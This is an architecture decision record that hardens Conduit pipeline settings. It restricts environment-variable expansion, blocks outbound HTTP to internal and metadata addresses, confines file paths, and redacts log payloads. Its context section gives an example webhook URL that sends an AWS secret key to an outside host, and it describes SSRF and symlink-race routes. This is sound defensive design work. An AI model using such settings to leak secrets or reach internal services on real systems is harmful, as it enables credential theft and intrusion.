# Pipeline settings get no ambient access to the host: deny by default, operator allowlists

## Summary

**Status: Accepted (DeVaris, 2026-10-21).** An ADR takes effect once merged.

Anything a pipeline author can put in a connector or processor setting is untrusted input, because
settings arrive over the API as well as from YAML. Four things a setting could reach on the host are
now closed by default and opened only by operator configuration (`conduit.yaml`, a flag, or
`CONDUIT_*` environment), never by a pipeline or an API field:

1. `${VAR}` expansion: only names in `env.allow` expand.
2. Outbound HTTP from built-in processors: private, loopback, link-local and metadata addresses are
   refused at dial time unless the exact destination is in `processors.egress.builtin-allow`.
3. Files: the built-in file connector and `custom.javascript` (`script.path`, `require()`) are
   confined to operator-configured directories.
4. The log connector (and so the default DLQ) writes no record key or payload unless `payload: true`.

## Context

`${VAR}` was expanded against the whole process environment for every setting
(`pkg/foundation/env`). A webhook URL such as `http://host/x?k=${AWS_SECRET_ACCESS_KEY}` sent the
secret to whoever runs `host`. `webhook.http` and `ollama.request` used `http.DefaultClient`, which
follows redirects and honours `HTTP(S)_PROXY`, so a URL (or, for the webhook, a template over record
data) could reach the metadata service and internal hosts. The dial-time resolved-IP guard in
`pkg/plugin/processor/egress` covered only WASM processors. The file connector accepted any path
and created output with the process umask (0644), and `custom.javascript` enabled goja's
`require()` with the default loader and read any `script.path`. The default DLQ is `builtin:log`
at warn, and the log connector wrote the full record.

The API is unauthenticated by default. The same reasoning as for ambient cloud credentials
(`20261012-operator-policy-for-builtin-ambient-credentials.md`) applies: whoever can create a
pipeline must not thereby act as the Conduit host.

## Decision

- **Environment.** `env.allow` is a list of exact variable names. `pkg/foundation/env` parses
  `${NAME}` and `$NAME` itself; defaults (`${NAME:-x}`), nesting and malformed references are
  refused (`config.env_ref_malformed`), a name not in the list is refused
  (`config.env_var_not_allowed`) before the environment is consulted, and an expanded value is never
  expanded again. It applies to YAML and API alike because both reach the same resolver at configure
  time. The resolver is installed on the connector and processor services by the runtime; a service
  built without one expands nothing.
- **Outbound HTTP.** `egress.DialGuard` builds the HTTP client for every built-in processor that
  dials (`webhook.http`, `ollama.request`, `openai.*`, `cohere.*`). It reuses `egress.Refuse` on every
  resolved address, dials the address it checked, pins `Transport.Proxy` to nil, and guards each
  redirect hop. Public destinations stay open: built-ins keep reaching the internet, the WASM-style
  host allowlist is not imposed. The only exemptions are exact `(IP, port)` or `(hostname, port)`
  entries in `processors.egress.builtin-allow`. A test scans `impl/` for any outbound call that
  bypasses the guard.
- **Files.** `pkg/foundation/pathpolicy` makes a path absolute, cleans it, resolves symlinks with
  `filepath.EvalSymlinks` (following a dangling link to its target, and resolving the existing
  ancestor of a path that does not exist yet) and checks containment. `connectors.file.allowed-dirs`
  defaults to `<data dir>/files`, not the whole data dir, because the data dir holds `conduit.db` and
  `conduit.yaml`. For `custom.javascript`, `script.path` reads from `processors.javascript.allowed-dirs`
  (default `<data dir>/scripts`) and `require()` exists only when that key is set explicitly, with a
  loader that applies the same check. The file connector's own fix (mode 0600) lives in
  `conduit-connector-file`.
- **Log connector.** `conduit-connector-log` logs the operation, salted hashes of the position and
  key and an allowlist of safe metadata keys by default; `payload: true` restores the full record.
- **Connector connection targets.** API writers are authenticated and trusted to choose where a
  built-in connector connects. Cloud metadata endpoints are refused for every connector; an optional
  `connectors.egress.allow` confines every target (Postgres hosts, Kafka brokers, the S3 endpoint),
  including names and what they resolve to. Checked at configuration, so DNS rebinding after it is
  not covered.
- Every refusal is a registered `ConduitError` with a config path and a suggestion naming the
  operator key to change. None of the operator keys is a connector or processor parameter.

## Consequences

- Breaking for pipelines that rely on any of the four behaviors. The migration steps are in the
  v0.21.0 release notes and the three runbooks under `docs/operations/`.
- A local Ollama needs `processors.egress.builtin-allow: ["http://127.0.0.1:11434"]`. Corporate proxies
  are no longer honoured by built-in HTTP processors; a proxy hop cannot be validated by a dial
  guard.
- For the plugins that open paths themselves the check is at configure time, not `open(2)`. A local
  user who can swap a directory component for a symlink in between can still redirect the open. The
  resolved path is passed to the plugin to narrow this; the allowed directories should be writable
  by the Conduit user only. Standalone connectors other than one named `file` are not path-checked: they are
  installed by the operator and run as separate processes.
- Other settings that name files are covered by a table (`fileRefs`) plus a test that fails when a
  built-in connector gains an unlisted file-looking parameter: the generator's file format
  (`connectors.file.allowed-dirs`) and Postgres' TLS and credential file parameters
  (`secrets.allowed-dirs`, separate from the data-file list because certificate material lives
  outside the data directories, default `<data dir>/secrets` plus the system CA directories).
- Lifecycle events and validation requests go through the same resolver and path policy as Configure.
- Where Conduit opens the file (`custom.javascript`, and the file destination through
  `file.WithOpener`) the policy is enforced again at open time without following symlinks. The file
  source, the generator and pgx open paths themselves; those stay configure-time checks.
- `$$` in YAML is collapsed by the parser (`envDecoderHook`) before the runtime resolver sees the
  text, so it cannot be used to write a literal `${VAR}`; such a value is now refused instead of
  silently expanded. Fixing the escape is separate work.

## Related

- `20261012-operator-policy-for-builtin-ambient-credentials.md`
- `docs/design-documents/20260726-wasm-host-egress-capability.md`
- `docs/design-documents/20261016-secrets-at-rest.md`
- `docs/operations/env-allowlist.md`, `docs/operations/outbound-http-egress.md`,
  `docs/operations/file-access.md`
